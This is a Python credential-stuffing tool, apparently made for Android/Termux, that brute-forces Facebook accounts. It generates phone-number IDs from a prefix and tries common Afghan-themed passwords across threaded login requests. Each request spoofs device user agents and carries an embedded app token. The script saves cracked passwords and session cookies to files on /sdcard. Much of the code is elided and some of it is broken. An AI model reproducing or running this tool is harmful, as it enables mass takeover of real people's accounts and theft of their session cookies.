...
💥----------------------------------------------💥
\033[1;33m :𝐀𝐔𝐓𝐇𝐄𝐑   : 𝐇𝐀𝐉𝐈-𝐀-𝐉-𝐊𝐇𝐀𝐍𝐎𝐎
\033[1;32m :𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 : 𝐌𝐑 𝐉𝐎𝐊𝐄𝐑-𝐀-𝐉 
\033[1;33m :𝐅𝐑𝐈𝐄𝐍𝐃   : 𝐀-𝐉-𝐊𝐇𝐀𝐍𝐎𝐎-𝐉𝐎𝐊𝐄𝐑
\033[1;33m :𝐕𝐄𝐑𝐒𝐈𝐎𝐍  : 1.8
\033[1;94m🌟-----------------------------------------------🌟
\033[1;33m          𝐑𝐀𝐄𝐄𝐒-𝐉𝐎𝐊𝐄𝐑                 𝐊𝐇𝐀𝐍𝐎𝐎
💥------------------------------------------------💥
\033[1;33m           𝐑𝐀𝐄𝐄𝐒-𝐉𝐎𝐊𝐄𝐑                𝐇𝐀𝐂𝐊𝐄𝐑
⭐------------------------------------------------⭐'"""
def linex():
	print('\033[1;36m-'*51)
def clear():
...
def pak():
                user=[]
                clear()
                print('\033[1;37m [\033[1;32m✓\033[1;37m] Example : \033[1;32m079,070,078,0345'),linex()
                ...
                with tred(max_workers=30) as ARIX:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'afghan000','pubg afghanistan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','afghan1234','kabul1234','khan123','khan123456','khan pubg','123456789','pubg king','ahmad123','jan123']
...
def ffb(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [𝐒𝐇𝐀𝐇𝐈-𝐉𝐎𝐊𝐄𝐑] %s| \033[1;37mOK : \033[1;32m%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [𝐒𝐇𝐀𝐇𝐈-𝐉𝐎𝐊𝐄𝐑] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])                                      
                                        open('/sdcard/𝐒𝐇𝐀𝐇𝐈-𝐉𝐎𝐊𝐄𝐑-OK-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/𝐒𝐇𝐀𝐇𝐈-𝐉𝐎𝐊𝐄𝐑-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[𝐒𝐇𝐀𝐇𝐈-𝐉𝐎𝐊𝐄𝐑] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [𝐒𝐇𝐀𝐇𝐈-𝐉𝐎𝐊𝐄𝐑] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/𝐒𝐇𝐀𝐇𝐈-𝐉𝐎𝐊𝐄𝐑-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/𝐒𝐇𝐀𝐇𝐈-𝐉𝐎𝐊𝐄𝐑-CP.txt','a').write(ids+'|'+pas+'\n')
...
'Content-Length': '706'}
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [CP-𝐒𝐇𝐀𝐇𝐈-𝐉𝐎𝐊𝐄𝐑] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/𝐒𝐇𝐀𝐇𝐈-𝐉𝐎𝐊𝐄𝐑-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
...
def api1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;32m [𝐒𝐇𝐀𝐇𝐈-𝐉𝐎𝐊𝐄𝐑] %s| \033[1;32mOK : \033[1;32m%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                ua ="Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))[FBAN/FB4A;FBAV/62.0.0.1973;FBBV/1983704;[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/ru_RU;FBCR/awcc;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T815|KOT49H;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi:;]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [OK-𝐒𝐇𝐀𝐇𝐈-𝐉𝐎𝐊𝐄𝐑] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/𝐒𝐇𝐀𝐇𝐈-𝐉𝐎𝐊𝐄𝐑-OK.txt','a').write(ids+'|'+pas+'\n')                                        
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;31m [CP-𝐒𝐇𝐀𝐇𝐈-𝐉𝐎𝐊𝐄𝐑] '+ids+' | '+pas+'\033[1;97m')                                                
                                                open('/sdcard/𝐒𝐇𝐀𝐇𝐈-𝐉𝐎𝐊𝐄𝐑-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [𝐒𝐇𝐀𝐇𝐈-𝐉𝐎𝐊𝐄𝐑] %s| \033[1;32mOK \033[1;37m: \033[1;32m%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        ...
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB','pa_PA','en_af'])
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China','awcc','mtn','Roshan','salaam'])                                                
                        ua ="Mozilla/5.0 (Linux; Android 11; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/82.0.4227.121 Mobile Safari/537.36 FBAN/FB4A;FBAV/'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}';FBPN/com.facebook.katana;FBLC/en_US;FBBV/str(random.randint(111111111,999999999));FBCR/MTN SALAAM;FBMF/Samsung;FBBD/samsung;FBDV/SM-G991U;FBSV/11;FBOP/5;FBCA/armeabi-v7a:armeabi:;]"
                        ua ="Mozilla/5.0 (Linux; Android 10; SM-A750G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 FBAN/FB4A;FBAV/'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}';FBPN/com.facebook.katana;FBLC/IT_IT;FBBV/str(random.randint(111111111,999999999));FBCR/ETISALAT;FBMF/Samsung;FBBD/samsung;FBDV/SM-A750G;FBSV/10;FBOP/5;FBCA/armeabi-v7a:armeabi:;]"
                        ua ="Mozilla/5.0 (Linux; Android 10.0; Samsung Xiaomi not 7 proBuild/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36 FBAN/FB4A;FBAV/260.0.0.31.128;FBBV/195597670;FBDM/{density=3.5,width=1440,height=3040};FBLC/en_US;FBRV/195597670;FB_FW/7;FBCR/zong;FBMF/XIAOMI;FBBD/XIAOMI;FBPN/com.facebook.katana;FBDV/ XT1635-02;FBSV/10.0;FBOP/1;FBCA/armeabi-v7a:armeabi:;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [OK-𝐒𝐇𝐀𝐇𝐈-𝐉𝐎𝐊𝐄𝐑] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])                                       
                                        open('/sdcard/𝐒𝐇𝐀𝐇𝐈-𝐉𝐎𝐊𝐄𝐑-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        open('/sdcard/𝐒𝐇𝐀𝐇𝐈-𝐉𝐎𝐊𝐄𝐑-OK-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[1;31m [CP-𝐒𝐇𝐀𝐇𝐈-𝐉𝐎𝐊𝐄𝐑] '+str(uid)+' | '+pas+'\033[1;97m')                                     
                                        open('/sdcard/𝐒𝐇𝐀𝐇𝐈-𝐉𝐎𝐊𝐄𝐑-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
